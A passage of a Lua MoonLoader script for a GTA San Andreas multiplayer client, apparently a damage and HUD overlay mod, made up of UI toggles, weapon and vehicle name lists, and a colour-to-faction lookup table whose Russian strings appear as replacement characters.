		show_afk = imgui.ImBool(true),
		show_carhp  = imgui.ImBool(true),
		show_anticrash = imgui.ImBool(true),
		show_squad = imgui.ImBool(true),
		show_500 = {["time500"] = 0, ["mult500"] = 1, ["bool500"] = imgui.ImBool(false)},
		show_dmind = {["bool"] = imgui.ImBool(true), ["damind"] = {["a_index"] = 0, ["shots"] = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}, ["hits"] = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}, ["damage"] = {[1] = 0, [23] = 0, [24] = 0, [25] = 0, [29] = 0, [30] = 0, [31] = 0, [33] = 0}}},
		othervars = {["saccess"] = false},
		show_dam = imgui.ImBool(true),
		show_fond = imgui.ImBool(true),
		rand = 0,
		show_mem1 = imgui.ImBool(false),
		show_otm = imgui.ImBool(false),
		otm_arr = {},
		show_lek = imgui.ImBool(false),
		lek_arr = {},
		show_weap = imgui.ImBool(false),
}
-- ���������� �������
local SetModeCond = 4 -- ��� ��� �����  �������� � 0 ���� ������ ����� �� ��� ������� �������� ������. ���� �� ������ ������ 4.
local SetMode = false -- ����� ���������� �� ��������� � ������ ������
-- ����� ��������
local wasset = false
local dinf = {
	[1] = {
		[1] = dinf_ini.Settings.dinf1 == 1 and true or false,
		[2] = false,
		["id"] = {[1] = -1, [2] = -1, [3] = -1},
		["nick"] = {[1] = "", [2] = "", [3] = ""},
		["clist"] = {[1] = "", [2] = "", [3] = ""},
		["weapon"] = {[1] = "", [2] = "", [3] = ""},
		["damage"] = {[1] = 0, [2] = 0, [3] = 0},
		["kill"] = {[1] = false, [2] = false, [3] = false},
	},

	[2] = {
		[1] = dinf_ini.Settings.dinf2 == 1 and true or false,
		[2] = false,
		["id"] = {[1] = -1, [2] = -1, [3] = -1},
		["nick"] = {[1] = "", [2] = "", [3] = ""},
		["clist"] = {[1] = "", [2] = "", [3] = ""},
		["weapon"] = {[1] = "", [2] = "", [3] = ""},
		["damage"] = {[1] = 0, [2] = 0, [3] = 0},
		["kill"] = {[1] = false, [2] = false, [3] = false},
	},
}
local give = {}
local A_Indexp = 0
while true do A_Indexp = A_Indexp + 1 if A_Indexp == 11 then A_Indexp = nil break end give[A_Indexp] = {["Status"] = imgui.ImBool(false), ["Damage"] = 0, ["x"] = 0, ["y"] = 0, ["z"] = 0, ["index"] = 0} end
local take = {}
local A_Indexp = 0
while true do A_Indexp = A_Indexp + 1 if A_Indexp == 1001 then A_Indexp = nil break end take[A_Indexp] = {["Status"] = imgui.ImBool(false), ["Dagame"] = 0, ["WeaponID"] = 0, ["index"] = 0} end
local indicator1 = {["Status"] = imgui.ImBool(false), ["Angle"] = 0, ["x"] = 0, ["y"] = 0, ["index"] = 0}
local indicator2 = {["Status"] = imgui.ImBool(false), ["Angle"] = 0, ["x"] = 0, ["y"] = 0, ["index"] = 0}
local indicator3 = {["Status"] = imgui.ImBool(false), ["Angle"] = 0, ["x"] = 0, ["y"] = 0, ["index"] = 0}
local BulletsHistory = {}
local lastDamage = 0
local lastHit = 0
local hittex1 = nil
local hittex2 = nil
local hittex3 = nil
local hitimage = nil
-- �������
local mem1 = {[1] = {}, [2] = {}, [3] = {}, [4] = {}, [5] = {}, [6] = {}}
local SetModeFirstShow = false

--[[local images = {
 	-- ���������� ����������� �����
	[1] = renderLoadTextureFromFileInMemory(memory.strptr(total_data), 256), 
	[2] = renderLoadTextureFromFileInMemory(memory.strptr(desert_eagleicon_data), 256), 
	[3] = renderLoadTextureFromFileInMemory(memory.strptr(chromegunicon_data), 256), 
	[4] = renderLoadTextureFromFileInMemory(memory.strptr(M4icon_data), 256), 
	[5] = renderLoadTextureFromFileInMemory(memory.strptr(cuntgunicon_data), 256), 
	[6] = nirenderLoadTextureFromFileInMemory(memory.strptr(mp5lngicon_data), 256)l, 
	-- ���� ������ ������
	[7] = renderLoadTextureFromFileInMemory(memory.strptr(unarmed_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\unarmed.png'), 
	[8] = renderLoadTextureFromFileInMemory(memory.strptr(desert_eagle_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\desert_eagle.png'), 
	[9] = renderLoadTextureFromFileInMemory(memory.strptr(shotgun_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\shotgun.png'), 
	[10] = renderLoadTextureFromFileInMemory(memory.strptr(mp5_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\mp5.png'), 
	[11] = renderLoadTextureFromFileInMemory(memory.strptr(m4_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\m4.png'), 
	[12] = renderLoadTextureFromFileInMemory(memory.strptr(rifle_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\rifle.png'), 
	[13] = renderLoadTextureFromFileInMemory(memory.strptr(parachute_data), 256), --imgui.CreateTextureFromFile('Moonloader\\Pictures\\weaps\\parachute.png'), 
	[14] = renderLoadTextureFromFileInMemory(memory.strptr(menu_data), 256),
	---
	[15] = renderLoadTextureFromFileInMemory(memory.strptr(showcmc_data), 256), -- ���������� ������
}				 ]]				
local crosimage = nil
local showcmcimage = nil
local crosMode = false
local pCros = false
local NeedtoLoadMem = false
local dx9font = renderCreateFont("times", 14, 12)
local tweapondist = {[23] = 50, [24] = 35, [25] = 40, [29] = 50, [30] = 80, [31] = 90, [33] = 100}
local tweapondamage = {[23] = 10, [24] = 47, [25] = 30, [29] = 8, [30] = 10, [31] = 10, [33] = 25}
local target = {["id"] = 1000, ["time"] = 0, ["suct"] = false}
local sx = 0
local sy = 0
local ped
local s_coord = {}
local tweaponNames = {[0] = "First", [1] = "Brass Knuckles", [2] = "Golf Club", [3] = "Nightstick", [4] = "Knife", [5] = "Baseball Bat", [6] = "Shovel", [7] = "Pool Cue", [8] = "Katana", [9] = "Chainsaw",
[10] = "Purple Dildo", [11] = "Dildo", [12] = "Vibrator", [13] = "Silver Vibrator", [14] = "Flowers", [15] = "Cane", [16] = "Grenade", [17] = "Tear Gas", [18] = "Molotov Cocktail", [22] = "9mm",
[23] = "Silenced pistol", [24] = "Desert Eagle", [25] = "Shotgun", [26] = "Sawnoff Shotgun", [27] = "Combat Shotgun", [28] = "Micro SMG/Uzi", [29] = "MP5", [30] = "AK-47", [31] = "M4", [32] = "Tec-9",
[33] = "Country Rifle", [34] = "Sniper Rifle", [35] = "RPG", [36] = "HS Rocket", [37] = "Flamethrower", [38] = "Minigun", [39] = "Satchel Charge", [40] = "Detonator", [41] = "Spraycan",
[42] = "Fire Extinguisher", [43] = "Camera", [44] = "Night Vis Goggles", [45] = "Thermal Goggles", [46] = "Parachute"}
local tVehicleNames = {"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel", "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
"Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam", "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BFInjection", "Hunter",
"Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie", "Stallion", "Rumpo",
"RCBandit", "Romero","Packer", "Monster", "Admiral", "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed",
"Yankee", "Caddy", "Solair", "Berkley'sRCVan", "Skimmer", "PCJ-600", "Faggio", "Freeway", "RCBaron", "RCRaider", "Glendale", "Oceanic", "Sanchez", "Sparrow",
"Patriot", "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX", "Burrito", "Camper", "Marquis", "Baggage",
"Dozer", "Maverick", "NewsChopper", "Rancher", "FBIRancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking", "BlistaCompact", "PoliceMaverick",
"Boxvillde", "Benson", "Mesa", "RCGoblin", "HotringRacerA", "HotringRacerB", "BloodringBanger", "Rancher", "SuperGT", "Elegant", "Journey", "Bike",
"MountainBike", "Beagle", "Cropduster", "Stunt", "Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "hydra", "FCR-900", "NRG-500", "HPV1000",
"CementTruck", "TowTruck", "Fortune", "Cadrona", "FBITruck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan", "Blade", "Freight",
"Streak", "Vortex", "Vincent", "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo", "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada",
"Yosemite", "Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance", "RCTiger", "Flash", "Tahoma", "Savanna", "Bandito",
"FreightFlat", "StreakCarriage", "Kart", "Mower", "Dune", "Sweeper", "Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400", "NewsVan",
"Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club", "FreightBox", "Trailer", "Andromada", "Dodo", "RCCam", "Launch", "PoliceCar", "PoliceCar",
"PoliceCar", "PoliceRanger", "Picador", "S.W.A.T", "Alpha", "Phoenix", "GlendaleShit", "SadlerShit", "Luggage A", "Luggage B", "Stairs", "Boxville", "Tiller",
"UtilityTrailer"}

local cIDs = {
	[1] = "����� 0", [2] = "����� 0", [3] = "����� 0",

	[4] = "����� 1", [5] = "����� 1", [6] = "����� 1",

	[7] = "����� 2", [8] = "����� 2", [9] = "����� 2",

	[10] = "����� 3", [11] = "����� 3", [12] = "����� 3",

	[13] = "����� 4", [14] = "����� 4", [15] = "����� 4",

	[16] = "���� ��", [17] = "���� ��", [18] = "���� ��", [19] = "���� ��", [20] = "���� ��",
	[21] = "���� ��",

	[22] = "������ ��", [23] = "������ ��", [24] = "������ ��", [25] = "������ ��", [26] = "������ ��",

	[27] = "������ ��", [28] = "������ ��", [29] = "������ ��", [30] = "������ ��", [31] = "������ ��",
	[32] = "������ ��", [33] = "������ ��", [34] = "������ ��",

	[35] = "������ ��", [36] = "������ ��", [37] = "������ ��",

	[38] = "������ ��", [39] = "������ ��",

	[40] = "������ �������", [41] = "������ �������",

	[42] = "�-10",

	[43] = "������ �-9",

	[44] = "������ ��", [45] = "������ ��", [46] = "������ ��", [47] = "������ ��", [48] = "������ ��",
	[49] = "������ ��", [50] = "������ ��",

	[51] = "������ ��", [52] = "������ ��", [53] = "������ ��", [54] = "������ ��", [55] = "������ ��",
	[56] = "������ ��", [57] = "������ ��", [58] = "������ ��", [59] = "������ ��",

	[60] = "������ ��", [61] = "������ ��", [62] = "������ ��", [63] = "������ ��", [64] = "������ ��",
	[65] = "������ ��", [66] = "������ ��", [67] = "������ ��", [68] = "������ ��", [69] = "������ ��",
	[70] = "������ ��", [71] = "������ ��", [72] = "������ ��", [73] = "������ ��", [74] = "������ ��",
	[75] = "������ ��",

	[76] = "������� ������", [77] = "������� ������", [78] = "������� ������", [79] = "������� ������", [80] = "������� ������",
	[81] = "������� ������", [82] = "������� ������", [83] = "������� ������", [84] = "������� ������", [85] = "������� ������",

	[86] = "������ ��",

	[87] = "������ ��",

	[88] = "������ ��", [89] = "������ ��", [90] = "������ ��", [91] = "������ ��", [92] = "������ ��",

	[93] = "������ �-9",

	[94] = "���� ��", [95] = "���� ��", [96] = "���� ��", [97] = "���� ��", [98] = "���� ��",
	[99] = "���� ��", [100] = "���� ��", [101] = "���� ��", [102] = "���� ��", [103] = "���� ��",
	[104] = "���� ��", [105] = "���� ��",

	[106] = "�� ��", [107] = "�� ��", [108] = "�� ��", [109] = "�� ��", [110] = "�� ��",

	[111] = "���������", [112] = "���������", [113] = "���������", [114] = "���������", [115] = "���������",

	[116] = "������� ��", [117] = "������� ��", [118] = "������� ��", [119] = "������� ��", [120] = "������� ��",
	[121] = "������� ��", [122] = "������� ��", [123] = "������� ��", [124] = "������� ��", [125] = "������� ��",
	[126] = "������� ��", [127] = "������� ��", [128] = "������� ��", [129] = "������� ��", [130] = "������� ��",
	[131] = "������� ��", [132] = "������� ��", [133] = "������� ��", [134] = "������� ��", [135] = "������� ��",
	[136] = "������� ��", [137] = "������� ��", [138] = "������� ��", [139] = "������� ��", [140] = "������� ��",
	[141] = "������� ��", [142] = "������� ��", [143] = "������� ��", [144] = "������� ��", [145] = "������� ��",
	[146] = "������� ��", [147] = "������� ��", [148] = "������� ��", [149] = "������� ��", [150] = "������� ��",

	[151] = "������� ��", [152] = "������� ��", [153] = "������� ��", [154] = "������� ��", [155] = "������� ��",
	[156] = "������� ��", [157] = "������� ��", [158] = "������� ��", [159] = "������� ��", [160] = "������� ��",
	[161] = "������� ��", [162] = "������� ��", [163] = "������� ��", [164] = "������� ��", [165] = "������� ��",
	[166] = "������� ��", [167] = "������� ��", [168] = "������� ��", [169] = "������� ��", [170] = "������� ��",
	[171] = "������� ��", [172] = "������� ��", [173] = "������� ��", [174] = "������� ��", [175] = "������� ��",
	[176] = "������� ��", [177] = "������� ��", [178] = "������� ��", [179] = "������� ��", [180] = "������� ��",
	[181] = "������� ��", [182] = "������� ��", [183] = "������� ��", [184] = "������� ��", [185] = "������� ��",

	[186] = "������� ��", [187] = "������� ��", [188] = "������� ��", [189] = "������� ��", [190] = "������� ��",
	[191] = "������� ��", [192] = "������� ��", [193] = "������� ��", [194] = "������� ��", [195] = "������� ��",
	[196] = "������� ��", [197] = "������� ��", [198] = "������� ��", [199] = "������� ��", [200] = "������� ��",
	[201] = "������� ��", [202] = "������� ��", [203] = "������� ��", [204] = "������� ��", [205] = "������� ��",
	[206] = "������� ��", [207] = "������� ��", [208] = "������� ��", [209] = "������� ��", [210] = "������� ��",
	[211] = "������� ��", [212] = "������� ��", [213] = "������� ��", [214] = "������� ��", [215] = "������� ��",
	[216] = "������� ��", [217] = "������� ��", [218] = "������� ��", [219] = "������� ��", [220] = "������� ��",
	[221] = "������� ��", [222] = "������� ��",

	[223] = "FBI", [224] = "FBI", [225] = "FBI", [226] = "FBI", [227] = "FBI",
	[228] = "FBI", [229] = "FBI", [230] = "FBI", [231] = "FBI", [232] = "FBI",
	[233] = "FBI", [234] = "FBI", [235] = "FBI", [236] = "FBI", [237] = "FBI",
	[238] = "FBI", [239] = "FBI", [240] = "FBI", [241] = "FBI", [242] = "FBI",
	[243] = "FBI", [244] = "FBI", [245] = "FBI", [246] = "FBI",

	[247] = "����� �� (������)", [248] = "����� �� (������)", [249] = "����� �� (������)", [250] = "����� �� (������)", [251] = "����� �� (������)",

	[252] = "����� ��", [253] = "����� ��", [254] = "����� ��", [255] = "����� ��", [256] = "����� ��",
	[257] = "����� ��", [258] = "����� ��", [259] = "����� ��", [260] = "����� ��", [261] = "����� ��",
	[262] = "����� ��", [263] = "����� ��", [264] = "����� ��", [265] = "����� ��", [266] = "����� ��",
	[267] = "����� ��", [268] = "����� ��", [269] = "����� ��",

	[270] = "�.�.�.�.", [271] = "�.�.�.�.", [272] = "�.�.�.�.", [273] = "�.�.�.�.",

	[274] = "����� ��", [275] = "����� ��", [276] = "����� ��",

	[277] = "�.�.�.�.", [278] = "�.�.�.�.", [279] = "�.�.�.�.", [280] = "�.�.�.�.", [281] = "�.�.�.�.",
	[282] = "�.�.�.�.",

	[283] = "����� ��", [284] = "����� ��", [285] = "����� ��", [286] = "����� ��", [287] = "����� ��",
	[288] = "����� ��", [289] = "����� ��", [290] = "����� ��", [291] = "����� ��", [292] = "����� ��",
	[293] = "����� ��", [294] = "����� ��", [295] = "����� ��",

	[296] = "������� �����������", [297] = "������� �����������", [298] = "������� �����������", [299] = "������� �����������", [300] = "������� �����������",
	[301] = "������� �����������", [302] = "������� �����������", [303] = "������� �����������", [304] = "������� �����������", [305] = "������� �����������",
	[306] = "������� �����������", [307] = "������� �����������", [308] = "������� �����������", [309] = "������� �����������", [310] = "������� �����������",
	[311] = "������� �����������", [312] = "������� �����������", [313] = "������� �����������",

	[314] = "���� ��", [315] = "���� ��", [316] = "���� ��", [317] = "���� ��", [318] = "���� ��",
	[319] = "���� ��", [320] = "���� ��", [321] = "���� ��", [322] = "���� ��", [323] = "���� ��",

	[324] = "����� ��", [325] = "����� ��", [326] = "����� ��", [327] = "����� ��", [328] = "����� ��",
	[329] = "����� ��", [330] = "����� ��", [331] = "����� ��", [332] = "����� ��", [333] = "����� ��",
	[334] = "����� ��", [335] = "����� ��", [336] = "����� ��", [337] = "����� ��", [338] = "����� ��",
	[339] = "����� ��", [340] = "����� ��", [341] = "����� ��", [342] = "����� ��", [343] = "����� ��",
	[344] = "����� ��", [345] = "����� ��", [346] = "����� ��", [347] = "����� ��", [348] = "����� ��",
	[349] = "����� ��", [350] = "����� ��", [351] = "����� ��", [352] = "����� ��", [353] = "����� ��",
	[354] = "����� ��", [355] = "����� ��", [356] = "����� ��", [357] = "����� ��", [358] = "����� ��",
	[359] = "����� ��", [360] = "����� ��", [361] = "����� ��", [362] = "����� ��", [363] = "����� ��",
	[364] = "����� ��", [365] = "����� ��", [366] = "����� ��", [367] = "����� ��", [368] = "����� ��",
	[369] = "����� ��",

	[370] = "���� ��",

	[371] = "������ ��", [372] = "������ ��", [373] = "������ ��", [374] = "������ ��", [375] = "������ ��",
	[376] = "������ ��", [377] = "������ ��", [378] = "������ ��", [379] = "������ ��", [380] = "������ ��",
	[381] = "������ ��", [382] = "������ ��", [383] = "������ ��", [384] = "������ ��", [385] = "������ ��",
	[386] = "������ ��", [387] = "������ ��", [388] = "������ ��",

	[389] = "������ �����", [390] = "������ �����", [391] = "������ �����", [392] = "������ �����",

	[393] = "������ �-18", [394] = "������ �-18", [395] = "������ �-18", [396] = "������ �-18",

	[397] = "������ ��", [398] = "������ ��", [399] = "������ ��", [400] = "������ ��", [401] = "������ ��",
	[402] = "������ ��", [403] = "������ ��", [404] = "������ ��", [405] = "������ ��", [406] = "������ ��",
	[407] = "������ ��",

	[408] = "������ ��", [409] = "������ ��", [410] = "������ ��", [411] = "������ ��", [412] = "������ ��",
	[413] = "������ ��", [414] = "������ ��", [415] = "������ ��", [416] = "������ ��", [417] = "������ ��",
	[418] = "������ ��", [419] = "������ ��", [420] = "������ ��", [421] = "������ ��",

	[422] = "������ ��", [423] = "������ ��", [424] = "������ ��", [425] = "������ ��", [426] = "������ ��",

	[427] = "������ �-7", [428] = "������ �-7", [429] = "������ �-7", [430] = "������ �-7",

	[431] = "�����", [432] = "�����", [433] = "�����", [434] = "�����", [435] = "�����",
	[436] = "�����", [437] = "�����", [438] = "�����", [439] = "�����", [440] = "�����",
	[441] = "�����", [442] = "�����", [443] = "�����", [444] = "�����", [445] = "�����",

	[446] = "���������", [447] = "���������", [448] = "���������", [449] = "���������", [450] = "���������",
	[451] = "���������", [452] = "���������", [453] = "���������", [454] = "���������", [455] = "���������",
	[456] = "���������", [457] = "���������", [458] = "���������", [459] = "���������", [460] = "���������",
	[461] = "���������", [462] = "���������",

	[463] = "������� ��", [464] = "������� ��", [465] = "������� ��", [466] = "������� ��", [467] = "������� ��",
	[468] = "������� ��", [469] = "������� ��", [470] = "������� ��",

	[471] = "������� ��", [472] = "������� ��", [473] = "������� ��", [474] = "������� ��", [475] = "������� ��",
	[476] = "������� ��", [477] = "������� ��", [478] = "������� ��",

	[479] = "������� ��", [480] = "������� ��", [481] = "������� ��", [482] = "������� ��", [483] = "������� ��",
	[484] = "������� ��", [485] = "������� ��", [486] = "������� ��",

	[487] = "LCn", [488] = "LCn", [489] = "LCn", [490] = "LCn", [491] = "LCn",
	[492] = "LCn", [493] = "LCn", [494] = "LCn", [495] = "LCn", [496] = "LCn",
	[497] = "LCn", [498] = "LCn", [499] = "LCn", [500] = "LCn", [501] = "LCn",
	[502] = "LCn",

	[503] = "Yakuza", [504] = "Yakuza", [505] = "Yakuza", [506] = "Yakuza", [507] = "Yakuza",
	[508] = "Yakuza", [509] = "Yakuza", [510] = "Yakuza", [511] = "Yakuza", [512] = "Yakuza",
	[513] = "Yakuza", [514] = "Yakuza", [515] = "Yakuza", [516] = "Yakuza", [517] = "Yakuza",
	[518] = "Yakuza",

	[519] = "RM", [520] = "RM", [521] = "RM", [522] = "RM", [523] = "RM",
	[524] = "RM", [525] = "RM", [526] = "RM", [527] = "RM", [528] = "RM",
	[529] = "RM", [530] = "RM", [531] = "RM", [532] = "RM", [533] = "RM",
	[534] = "RM",

	[535] = "Rifa", [536] = "Rifa", [537] = "Rifa", [538] = "Rifa", [539] = "Rifa",
	[540] = "Rifa", [541] = "Rifa", [542] = "Rifa",

	[543] = "Groove", [544] = "Groove", [545] = "Groove", [546] = "Groove", [547] = "Groove",
	[548] = "Groove", [549] = "Groove", [550] = "Groove",

	[551] = "Ballas", [552] = "Ballas", [553] = "Ballas", [554] = "Ballas", [555] = "Ballas",
	[556] = "Ballas", [557] = "Ballas", [558] = "Ballas",

	[559] = "Vagos", [560] = "Vagos", [561] = "Vagos", [562] = "Vagos", [563] = "Vagos",
	[564] = "Vagos", [565] = "Vagos", [566] = "Vagos",

	[567] = "Aztec", [568] = "Aztec", [569] = "Aztec", [570] = "Aztec", [571] = "Aztec",
	[572] = "Aztec", [573] = "Aztec", [574] = "Aztec",

	[575] = "Hell Angels MC", [576] = "Hell Angels MC", [577] = "Hell Angels MC", [578] = "Hell Angels MC", [579] = "Hell Angels MC",
	[580] = "Hell Angels MC", [581] = "Hell Angels MC", [582] = "Hell Angels MC", [583] = "Hell Angels MC", [584] = "Hell Angels MC",
	[585] = "Hell Angels MC", [586] = "Hell Angels MC",

	[587] = "Mongols MC", [588] = "Mongols MC", [589] = "Mongols MC", [590] = "Mongols MC", [591] = "Mongols MC",
	[592] = "Mongols MC", [593] = "Mongols MC", [594] = "Mongols MC", [595] = "Mongols MC", [596] = "Mongols MC",
	[597] = "Mongols MC", [598] = "Mongols MC",

	[599] = "Pagans MC", [600] = "Pagans MC", [601] = "Pagans MC", [602] = "Pagans MC", [603] = "Pagans MC",
	[604] = "Pagans MC", [605] = "Pagans MC", [606] = "Pagans MC", [607] = "Pagans MC", [608] = "Pagans MC",
	[609] = "Pagans MC", [610] = "Pagans MC",

	[611] = "Outlaws MC", [612] = "Outlaws MC", [613] = "Outlaws MC", [614] = "Outlaws MC", [615] = "Outlaws MC",
	[616] = "Outlaws MC", [617] = "Outlaws MC", [618] = "Outlaws MC", [619] = "Outlaws MC", [620] = "Outlaws MC",
	[621] = "Outlaws MC", [622] = "Outlaws MC",

	[623] = "Sons of Silence MC", [624] = "Sons of Silence MC", [625] = "Sons of Silence MC", [626] = "Sons of Silence MC", [627] = "Sons of Silence MC",
	[628] = "Sons of Silence MC", [629] = "Sons of Silence MC", [630] = "Sons of Silence MC", [631] = "Sons of Silence MC", [632] = "Sons of Silence MC",
	[633] = "Sons of Silence MC", [634] = "Sons of Silence MC",

	[635] = "Warlocks MC", [636] = "Warlocks MC", [637] = "Warlocks MC", [638] = "Warlocks MC", [639] = "Warlocks MC",
	[640] = "Warlocks MC", [641] = "Warlocks MC", [642] = "Warlocks MC", [643] = "Warlocks MC", [644] = "Warlocks MC",
	[645] = "Warlocks MC", [646] = "Warlocks MC",

	[647] = "Highwaymen MC", [648] = "Highwaymen MC", [649] = "Highwaymen MC", [650] = "Highwaymen MC", [651] = "Highwaymen MC",
	[652] = "Highwaymen MC", [653] = "Highwaymen MC", [654] = "Highwaymen MC", [655] = "Highwaymen MC", [656] = "Highwaymen MC",
	[657] = "Highwaymen MC", [658] = "Highwaymen MC",

	[659] = "Bandidos MC", [660] = "Bandidos MC", [661] = "Bandidos MC", [662] = "Bandidos MC", [663] = "Bandidos MC",
	[664] = "Bandidos MC", [665] = "Bandidos MC", [666] = "Bandidos MC", [667] = "Bandidos MC", [668] = "Bandidos MC",
	[669] = "Bandidos MC", [670] = "Bandidos MC",

	[671] = "Free Souls MC", [672] = "Free Souls MC", [673] = "Free Souls MC", [674] = "Free Souls MC", [675] = "Free Souls MC",
	[676] = "Free Souls MC", [677] = "Free Souls MC", [678] = "Free Souls MC", [679] = "Free Souls MC", [680] = "Free Souls MC",
	[681] = "Free Souls MC", [682] = "Free Souls MC",

	[683] = "Vagos MC", [684] = "Vagos MC", [685] = "Vagos MC", [686] = "Vagos MC", [687] = "Vagos MC",
	[688] = "Vagos MC", [689] = "Vagos MC", [690] = "Vagos MC", [691] = "Vagos MC", [692] = "Vagos MC",
	[693] = "Vagos MC", [694] = "Vagos MC",

	[695] = "�� ��", [696] = "�� ��", [697] = "�� ��", [698] = "�� ��", [699] = "�� ��",
	[700] = "�� ��",

	[701] = "�-14", [702] = "�-14",

	[703] = "�� ��", [704] = "�� ��", [705] = "�� ��", [706] = "�� ��", [707] = "�� ��",
	[708] = "�� ��", [709] = "�� ��", [710] = "�� ��", [711] = "�� ��",

	[712] = "�� ��", [713] = "�� ��", [714] = "�� ��", [715] = "�� ��", [716] = "�� ��",
	[717] = "�� ��", [718] = "�� ��", [719] = "�� ��", [720] = "�� ��", [721] = "�� ��",
	[722] = "�� ��", [723] = "�� ��", [724] = "�� ��",

	[725] = "�� ��", [726] = "�� ��", [727] = "�� ��", [728] = "�� ��", [729] = "�� ��",
	[730] = "�� ��", [731] = "�� ��",

	[732] = "Jefferson", [733] = "Jefferson", [734] = "Jefferson", [735] = "Jefferson", [736] = "Jefferson",
	[737] = "Jefferson", [738] = "Jefferson", [739] = "Jefferson", [740] = "Jefferson", [741] = "Jefferson",
	[742] = "Jefferson", [743] = "Jefferson", [744] = "Jefferson", [745] = "Jefferson",

	[746] = "���� ��", [747] = "���� ��", [748] = "���� ��", [749] = "���� ��", [750] = "���� ��",
	[751] = "���� ��", [752] = "���� ��", [753] = "���� ��", [754] = "���� ��",

	[755] = "�-18", [756] = "�-18", [757] = "�-18", [758] = "�-18",

	[759] = "������� �����", [760] = "������� �����", [761] = "������� �����", [762] = "������� �����", [763] = "������� �����",
	[764] = "������� �����", [765] = "������� �����", [766] = "������� �����", [767] = "������� �����", [768] = "������� �����",
	[769] = "������� �����", [770] = "������� �����", [771] = "������� �����", [772] = "������� �����", [773] = "������� �����",
	[774] = "������� �����", [775] = "������� �����", [776] = "������� �����", [777] = "������� �����", [778] = "������� �����",
	[779] = "������� �����",

	[780] = "���� ��", [781] = "���� ��", [782] = "���� ��", [783] = "���� ��", [784] = "���� ��",
	[785] = "���� ��", [786] = "���� ��", [787] = "���� ��",

	[788] = "������� �����", [789] = "������� �����", [790] = "������� �����", [791] = "������� �����", [792] = "������� �����",
	[793] = "������� �����", [794] = "������� �����",

	[795] = "�� ��", [796] = "�� ��", [797] = "�� ��", [798] = "�� ��", [799] = "�� ��",
	[800] = "�� ��", [801] = "�� ��", [802] = "�� ��", [803] = "�� ��",

	[804] = "�� ��", [805] = "�� ��", [806] = "�� ��", [807] = "�� ��", [808] = "�� ��",
	[809] = "�� ��", [810] = "�� ��", [811] = "�� ��", [812] = "�� ��",

	[813] = "�� ��", [814] = "�� ��", [815] = "�� ��", [816] = "�� ��", [817] = "�� ��",
	[818] = "�� ��", [819] = "�� ��", [820] = "�� ��",

	[821] = "�� �� (��� ������)", [822] = "�� �� (��� ������)", [823] = "�� �� (��� ������)", [824] = "�� �� (��� ������)", [825] = "�� �� (��� ������)",
	[826] = "�� �� (��� ������)", [827] = "�� �� (��� ������)", [828] = "�� �� (��� ������)", [829] = "�� �� (��� ������)", [830] = "�� �� (��� ������)",
	[831] = "�� �� (��� ������)", [832] = "�� �� (��� ������)", [833] = "�� �� (��� ������)", [834] = "�� �� (��� ������)", [835] = "�� �� (��� ������)",
	[836] = "�� �� (��� ������)", [837] = "�� �� (��� ������)", [838] = "�� �� (��� ������)", [839] = "�� �� (��� ������)", [840] = "�� �� (��� ������)",
	[841] = "�� �� (��� ������)", [842] = "�� �� (��� ������)",

	[843] = "���������", [844] = "���������", [845] = "���������", [846] = "���������", [847] = "���������",
	[848] = "���������",

	[849] = "���������� 2", [850] = "���������� 2", [851] = "���������� 2", [852] = "���������� 2", [853] = "���������� 2",
	[854] = "���������� 2", [855] = "���������� 2", [856] = "���������� 2",

	[863] = "���������", [864] = "���������", [865] = "���������",

	[869] = "���������� 2", [870] = "���������� 2",

	[872] = "���������", [873] = "���������", [874] = "���������",

	[878] = "���������� 2", [879] = "���������� 2", [880] = "���������� 2",

	[881] = "������ �-12", [882] = "������ �-12", [883] = "������ �-12", [884] = "������ �-12", [885] = "������ �-12",
	[886] = "������ �-12",

	[887] = "������ ��", [888] = "������ ��", [889] = "������ ��", [890] = "������ ��", [891] = "������ ��",
	[892] = "������ ��",

	[897] = "�� �� (��� ������)", [898] = "�� �� (��� ������)", [899] = "�� �� (��� ������)", [900] = "�� �� (��� ������)", [901] = "�� �� (��� ������)",
	[902] = "�� �� (��� ������)",

	[916] = "���������", [917] = "���������", [918] = "���������", [919] = "���������", [920] = "���������",
	[921] = "���������", [922] = "���������", [923] = "���������", [924] = "���������", [925] = "���������",
	[926] = "���������", [927] = "���������", [928] = "���������", [929] = "���������", [930] = "���������",
	[931] = "���������", [932] = "���������", [933] = "���������", [934] = "���������",

	[935] = "������ �-3", [936] = "������ �-3", [937] = "������ �-3", [938] = "������ �-3", [939] = "������ �-3",
	[940] = "������ �-3", [941] = "������ �-3", [942] = "������ �-3", [943] = "������ �-3", [944] = "������ �-3",
	[945] = "������ �-3", [946] = "������ �-3", [947] = "������ �-3", [948] = "������ �-3", [949] = "������ �-3",
	[950] = "������ �-3", [951] = "������ �-3",

	[1005] = "���� ��", [1006] = "���� ��", [1007] = "���� ��", [1008] = "���� ��", [1009] = "���� ��",
